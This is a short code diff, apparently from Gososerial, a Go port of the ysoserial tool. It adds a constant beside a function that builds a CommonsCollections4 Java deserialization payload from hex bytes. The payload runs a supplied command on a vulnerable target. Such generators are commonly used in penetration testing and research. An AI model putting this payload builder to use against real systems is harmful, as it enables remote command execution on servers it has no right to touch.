@@ -5,6 +5,8 @@ import (
 	"github.com/EmYiQing/Gososerial/ysoserial/util"
 )
 
+const CC4 = "CommonsCollections4"
+
 func GetCommonsCollections4(cmd string) []byte {
 	globalPrefix := "ACED0005737200176A6176612E7574696C2E5072696F72697479517565" +
 		"756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F7274" +
